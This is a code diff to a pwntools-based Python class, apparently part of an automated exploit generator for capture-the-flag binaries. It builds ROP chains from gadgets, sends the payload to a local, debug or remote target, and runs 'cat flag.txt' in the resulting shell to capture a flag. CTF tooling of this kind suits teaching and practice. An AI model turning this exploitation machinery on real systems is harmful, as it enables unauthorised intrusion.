@@ -17,7 +17,8 @@ class Against:
             arch = "amd64",
             endian = "little",
             log_level = "CRITICAL",
-            os = "linux"
+            os = "linux",
+            terminal = "st"
         )
 
         self.binary = binary_path
@@ -27,6 +28,7 @@ class Against:
         self.machine = machine
         self.ip = ip
         self.port = port
+        self.debug = False
 
         self.flag = None
         self.flag_format = "flag"
@@ -34,7 +36,10 @@ class Against:
         self.libc_offset_string = b""
         self.canary_offset_string = b""
         self.format_write_string = b""
+
+        self.process = None
         
+        self.chain = None
         self.padding = None
         self.exploit = None
 
@@ -49,6 +54,7 @@ class Against:
         if option == "REMOTE":
             return remote(self.ip, self.port)
         elif option == "GDB":
+            self.debug = True
             return gdb.debug(self.binary, gdbscript=gs)
         else:
             return process(self.binary)
@@ -113,9 +119,12 @@ class Against:
                 reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
                 if reg_gadgets != None:
                     for reg_gadget_str in reg_gadgets:
+                        #print(reg_gadget_str + b" ", end=None)
                         reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
                         chain += reg_gadget + p64(parameters[i])
+                        #print(str(parameters[i]) + " ", end=None)
                         instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
+                        #print(instructions, end=None)
                         for inst in instructions:
                             if b"pop" in inst:
                                 reg = inst.strip(b" ").split(b" ")[1]
@@ -261,26 +270,38 @@ class Against:
         """Return a format write string payload."""
         return None
 
-    def send_exploit(self, process):
+    def send_exploit(self):
         """Send the exploit that was generated."""
+        #aegis_log.info(f"Sending exploit with padding {self.padding} and chain {self.chain}")
+        aegis_log.info(f"Sending chain as {self.chain}") 
         if self.exploit != None:
-            process.sendline(self.exploit)
+            if self.debug == True:
+                self.process.sendline(self.exploit)
+                self.process.interactive()
+            else:
+                self.process.sendline(self.exploit)
 
 
-    def verify_flag(self, process):
+    def verify_flag(self):
         """Return whether the exploit worked or didn't."""
-        return None
+        if self.recieve_flag() == 1:
+            aegis_log.info(f"Exploit works got flag {self.flag}")
+            return True
+        else:
+            return False
 
-    def recieve_flag(self, process):
+    def recieve_flag(self):
         """Return the flag after parsing it from the binary."""
-        process.sendline(b"cat flag.txt")
         try:
-            output = process.recvall(timeout=2)
+            self.process.sendline(b"cat flag.txt")
+            output = self.process.recvall(timeout=2)
+            aegis_log.info(f"Recieved output {output}")
             if b"{" in output and b"}":
                 self.flag = b"{" + output.split(b"{")[1].replace(b" ", b"")
                 self.flag = self.flag.replace(b"\n", b"").split(b"}")[0] + b"}"
                 self.flag = self.flag.decode()
-                aegis.log(f"Captured the flag !!! {self.flag}")
+                self.flag = self.flag_format + self.flag 
+                aegis_log.info(f"Captured the flag !!! {self.flag}")
                 return 1
         except EOFError:
             return -1
